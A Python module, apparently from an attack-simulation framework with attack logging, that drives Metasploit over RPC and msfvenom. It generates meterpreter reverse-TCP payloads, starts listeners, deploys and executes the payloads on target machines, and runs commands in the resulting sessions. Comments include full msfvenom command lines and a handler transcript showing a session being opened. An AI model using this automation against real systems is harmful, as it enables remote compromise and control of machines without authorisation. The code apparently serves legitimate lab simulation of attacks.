#!/usr/bin/env python3

from pymetasploit3.msfrpc import MsfRpcClient
# from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.interface_sfx import CommandlineColors
import time
import socket
from app.exceptions import MetasploitError


import os

# https://github.com/DanMcInerney/pymetasploit3


class Metasploit():
    def __init__(self, password, **kwargs):
        """

        :param password: password for the msfrpcd
        :param kwargs: Relevant ones: uri, port, server, username
        """

        self.password = password
        self.kwargs = kwargs
        self.client = None

        # Optional attacker: If a running attacker machine is passed, we take it and start the msfrpcd
        # Alternative: The server is taken and we expect an already running msfrpcd there
        self.attacker = kwargs.get("attacker", None)
        if self.attacker:
            # we expect a running attacker but without a running msfrcpd
            self.start_msfrpcd(kwargs.get("username"))
            kwargs["server"] = self.attacker.get_ip()
            time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.

    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler'):
        """

        @:returns: res, which contains "job_id" and "uuid"
        """
        exploit = self.get_client().modules.use('exploit', exploit)
        # print(exploit.description)
        # print(exploit.missing_required)
        payload = self.get_client().modules.use('payload', payload)
        # print(payload.description)
        # print(payload.missing_required)
        payload["LHOST"] = self.attacker.get_ip()
        res = exploit.execute(payload=payload)
        print(res)
        return res

    def start_msfrpcd(self, username):
        """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """

        cmd = f"msfrpcd -P {self.password} -U {username} -S"

        self.attacker.remote_run(cmd, disown=True)

    def get_client(self):
        """ Get a local metasploit client connected to the metasploit server """
        if self.client:
            return self.client
        self.client = MsfRpcClient(self.password, **self.kwargs)
        return self.client

    def wait_for_session(self):
        """ Wait until we get a session """

        retries = 50
        while self.get_client().sessions.list == {}:
            time.sleep(1)
            print(f"Waiting to get any session {retries}")
            retries -= 1
            if retries <= 0:
                raise MetasploitError("Can not find any session")

    def get_sid(self, session_number=0):
        """ Get the first session between hacked target and the metasploit server

        @param session_number: number of the session to get
        """

        self.wait_for_session()

        return list(self.get_client().sessions.list)[session_number]

    def get_sid_to(self, target):
        """ Get the session to a specified target

        @param target: a target machine to find in the session list
        """

        print(f"Sessions: {self.get_client().sessions.list}")

        # Get_ip can also return a network name. Matching a session needs a real ip
        name_resolution_worked = True
        try:
            ip = socket.gethostbyname(target.get_ip())
        except socket.gaierror:
            ip = target.get_ip()   # Limp on feature if we can not get a name resolution
            name_resolution_worked = False
            print(f"Name resolution for {target.get_ip()} failed. Sessions are: {self.get_client().sessions.list}")
            # TODO: Try to get the ip address from kali system

        retries = 100
        while retries > 0:
            for k, v in self.get_client().sessions.list.items():
                if v["session_host"] == ip:
                    # print(f"session list: {self.get_client().sessions.list}")
                    return k

            time.sleep(1)
            retries -= 1
        raise MetasploitError(f"Could not find session for {target.get_ip()} Name resolution worked: {name_resolution_worked}")

    def meterpreter_execute(self, cmds: [str], session_number: int, delay=0) -> str:
        """ Executes commands on the meterpreter, returns results read from shell

        @param cmds: commands to execute, a list
        @param session_number: session number
        @param delay: optional delay between calling the command and expecting a result
        @:return: the string results
        """

        shell = self.client.sessions.session(self.get_sid(session_number))
        res = []
        for cmd in cmds:
            shell.write(cmd.strip())
            time.sleep(delay)
            res.append(shell.read())
        return res

    def meterpreter_execute_on(self, cmds: [str], target, delay=0) -> str:
        """ Executes commands on the meterpreter, returns results read from shell

        @param cmds: commands to execute, a list
        @param target: target machine
        @param delay: optional delay between calling the command and expecting a result
        @:return: the string results
        """

        session_id = self.get_sid_to(target)
        # print(f"Session ID: {session_id}")
        shell = self.client.sessions.session(session_id)
        res = []
        time.sleep(1)  # To ensure an active session
        for cmd in cmds:
            shell.write(cmd)
            time.sleep(delay)
            retries = 20
            r = ""
            while retries > 0:
                r += shell.read()
                time.sleep(0.5)   # Command needs time to execute
                retries -= 1
            res.append(r)

        return res

##########################################################################


class MSFVenom():
    def __init__(self, attacker, target, attack_logger: AttackLog):
        """

        :param attacker: attacker machine
        :param target: target machine
        :param attack_logger: The logger for the attack
        """
        # https://www.offensive-security.com/metasploit-unleashed/msfvenom/

        self.attacker = attacker
        self.target = target
        self.attack_logger = attack_logger

    def generate_cmd(self, **kwargs):
        """ Generates a cmd


        :return:
        """
        payload = kwargs.get("payload", None)
        architecture = kwargs.get("architecture", None)
        platform = kwargs.get("platform", self.target.get_os())
        lhost = kwargs.get("lhost", self.attacker.get_ip())
        format = kwargs.get("format", None)  # file format
        outfile = kwargs.get("outfile", "payload.exe")

        cmd = "msfvenom"
        if architecture is not None:
            cmd += f" -a {architecture}"
        if platform is not None:
            cmd += f" --platform {platform}"
        if payload is not None:
            cmd += f" -p {payload}"
        if lhost is not None:
            cmd += f" LHOST={lhost}"
        if format is not None:
            cmd += f" -f {format}"
        if outfile is not None:
            cmd += f" -o {outfile}"

        # -p payload  linux/x86/meterpreter_reverse_tcp
        # -f format: elf, exe, powershell, python
        # --platform: linux, windows, osx
        # -a arch: x86, x64
        # -e encoders: x86/shikata_ga_nai
        # -b bad chars to avoid
        # -i iterations. encoding iterations
        # -o <filename> out filename
        # root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
        # complex: msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.178.125 -e x86/shikata_ga_nai -i 3 -f elf -o reverse_meterpreter

        # verified to work (Linux): msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.178.125  -f elf -o reverse_meterpreter

        # Keep in mind: The msfconsole needs to actively listen to the connection:
        # msf6 > use exploit/multi/handler
        # [*] Using configured payload generic/shell_reverse_tcp
        # msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
        # payload => linux/x64/meterpreter_reverse_tcp
        # msf6 exploit(multi/handler) > set lhost 192.168.178.125
        # lhost => 192.168.178.125
        # msf6 exploit(multi/handler) > set lport 4444
        # lport => 4444
        # msf6 exploit(multi/handler) > run
        #
        # [*] Started reverse TCP handler on 192.168.178.125:4444
        # [*] Meterpreter session 1 opened (192.168.178.125:4444 -> 192.168.178.125:42436) at 2021-06-01 03:32:12 -0400
        #
        # meterpreter >   !!! We are in the session now !!!

        return cmd

    def generate_payload(self, **kwargs):
        """ Generates a payload on the attacker machine

        """
        cmd = self.generate_cmd(**kwargs)

        self.attacker.remote_run(cmd)

    def generate_and_deploy(self, **kwargs):
        """ Will generate the payload and directly deploy it to the target

        :return:
        """
        self.generate_payload(**kwargs)

        payload_name = kwargs.get("outfile", "payload.exe")

        self.attacker.get(payload_name, self.target.get_machine_path_external())
        src = os.path.join(self.target.get_machine_path_external(), payload_name)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Generated {payload_name}...deploying it{CommandlineColors.ENDC}",
            1)
        # Deploy to target
        if self.attack_logger:
            self.attack_logger.start_file_write("", self.target.get_name(), payload_name)
        playground = self.target.get_playground()
        print(f"Putting to playground {playground}")
        self.target.put(src, playground)
        if self.attack_logger:
            self.attack_logger.stop_file_write("", self.target.get_name(), payload_name)

        if self.target.get_os() == "linux":
            if self.target.get_playground() is not None:
                cmd = f"cd {self.target.get_playground()};"
            else:
                cmd = ""
            cmd += f"chmod +x {payload_name}; ./{payload_name}"
        if self.target.get_os() == "windows":
            cmd = f'{payload_name}'

        print(cmd)

        if self.attack_logger:
            self.attack_logger.start_execute_payload("", self.target.get_name(), cmd)
        res = self.target.remote_run(cmd, disown=True)
        print(f"Running payload, result is {res}")
        if self.attack_logger:
            self.attack_logger.stop_execute_payload("", self.target.get_name(), cmd)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
            1)
